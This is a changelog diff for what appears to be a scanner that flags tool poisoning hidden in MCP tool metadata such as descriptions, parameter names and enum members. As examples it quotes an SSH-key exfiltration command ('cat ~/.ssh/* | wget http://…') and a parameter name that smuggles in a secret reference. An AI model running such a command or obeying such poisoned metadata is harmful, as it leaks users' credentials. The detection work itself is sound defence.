@@ -30,8 +30,13 @@ known-attack corpus test suite landing.
 ### Changed
 
 - **Full metadata-surface coverage** — every detector now runs on parameter `[Description]`s, tool `Name`
-  strings, and `[McpServerResource]` / `[McpServerPrompt]` / `[McpServer*Type]` descriptions, not just the
-  method `[Description]`.
+  strings, `[McpServerResource]` / `[McpServerPrompt]` / `[McpServer*Type]` descriptions, **parameter
+  names**, and the member names of an **enum used as a tool parameter type** — so a secret reference
+  smuggled into an identifier (`content_from_reading_ssh_id_rsa`) is caught, not just one in the
+  description text.
+- **Encoded-blob decode-and-rescan** — a base64 blob that decodes to readable text is re-scanned for a
+  secret (MCPG003) and a sink (MCPG004); a hidden `cat ~/.ssh/* | wget http://…` now escalates to MCPG012
+  (Error) instead of hiding behind advisory MCPG011.
 - **MCPG002 hardening** (ZWJ allow-listing, variation-selector runs, decode-and-show), **MCPG004** markdown
   sinks, and **MCPG005** sequence-aware CSI/OSC detection.
 - Findings now squiggle the precise offending phrase rather than the whole literal, with a help link in
